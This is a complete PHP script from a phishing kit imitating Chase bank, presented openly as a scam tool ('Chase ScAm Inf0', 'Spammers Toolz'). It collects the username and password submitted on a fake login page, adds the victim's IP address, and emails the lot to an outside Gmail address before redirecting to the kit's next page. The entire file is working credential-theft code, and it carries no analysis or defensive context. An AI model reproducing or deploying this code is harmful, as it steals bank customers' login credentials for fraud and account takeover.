<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Chase ScAm Inf0 (1) || :------\n";
$message .= "Username: ".$_POST['1']."\n";
$message .= "Password: ".$_POST['2']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "jamesrich1213@gmail.com";
$subject = "uS3r | ".$ip."\n";

mail($recipient,$subject,$message);

header("Location:  Chase2.html");
?>





